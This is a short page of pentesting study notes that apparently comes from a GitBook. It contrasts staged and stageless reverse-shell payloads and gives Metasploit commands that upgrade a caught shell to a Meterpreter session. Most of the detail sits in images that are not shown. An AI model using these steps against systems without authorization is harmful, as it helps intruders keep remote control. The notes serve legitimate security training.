# Shells

![](<../../../../.gitbook/assets/image (333).png>)

## Staged Payloads

A payload that is not enough to create a shell itself

It is a downloader part that needs to download and execute the rest of the payload

It is much smaller

![](<../../../../.gitbook/assets/image (21).png>)

You're required to use a Metasploit listener in order to receive the shell connection

The listerner payload has to be exactly the same as the msfvenom payload

![](<../../../../.gitbook/assets/image (41).png>)

![](<../../../../.gitbook/assets/image (497).png>)

## Stageless Payloads

A standalone program that doesn't need anything additional, just the netcat listener on your computer

Its size is much bigger

![](<../../../../.gitbook/assets/image (397).png>)

## Using Metasploit to Catch a Shell

![](<../../../../.gitbook/assets/image (496).png>)

![](<../../../../.gitbook/assets/image (295).png>)

### Upgrading to Meterpreter Shell

```
Ctrl+Z or background
use post/multi/manage/shell_to_meterpreter
set lhost [HOST]
set lport [PORT]
set session [SESSION ID]
run
```
